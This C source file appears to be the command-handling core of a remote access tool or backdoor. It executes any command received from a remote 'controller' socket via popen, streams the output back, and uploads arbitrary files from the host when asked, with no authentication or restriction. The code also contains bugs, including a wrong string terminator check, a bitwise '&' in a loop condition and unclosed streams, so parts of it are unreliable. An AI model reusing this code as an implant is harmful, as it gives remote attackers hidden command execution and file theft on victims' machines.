#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
void screen_refresher(int client_fd){
  return;
}

void send_file(int client_fd, char* filepath){
  if (client_fd==0){
    printf("connection error\n");
    return;
  }
  FILE* fp;
  fp = fopen(filepath,"rb");
  if (!fp){
    printf("error opening %s\n",filepath);
    return;
  }
  
 
  char file_segment[256];

  size_t bytes_read = 0;
  while((bytes_read = fread(file_segment,1,256,fp)) > 0){
    send(client_fd,file_segment,bytes_read,0);
  }

/*client side:

  size_t bytes_received = 0;
  while((bytes_received = recv(server_fd,buffer,buffer_size,0)) > 0){
    fwrite(buffer,1,bytes_received,fp)
  }
  
*/
  fclose(fp);
}


void handle_command(int client_fd, char* command){
  screen_refresher(client_fd);
  
  char* end = command;
  while(*command==' ')command++;
  while(*end!='\n' & *end!='0') end++; *end = 0;
  printf("handling command %s\n",command);
  
  if (strncmp(command,"cd ",strlen("cd "))==0){
    command+=strlen("cd ");
    printf("[!] changing directory to %s\n",command);
    chdir(command);
    return;
  }
  if (strncmp(command,"nano ",strlen("nano "))==0){
    command+=strlen("nano ");
    printf("[!] sending %s to client (controller)\n",command);
    send_file(client_fd,command);
    return;
  }
  char* response = malloc(256);
  FILE* fp = popen(command,"r");
  while(fgets(response,256,fp)!=NULL){
    printf("sending %s %d\n",response,(int)strlen(response));
    send(client_fd,response,strlen(response),0);
  }
  
}


// int main(){
//   char* input_buf = malloc(64);
//   printf("enter command:\n");
//   while (1){
//     printf(">");
//     fgets(input_buf,64,stdin);
//     handle_command(0,input_buf);
//   }
// }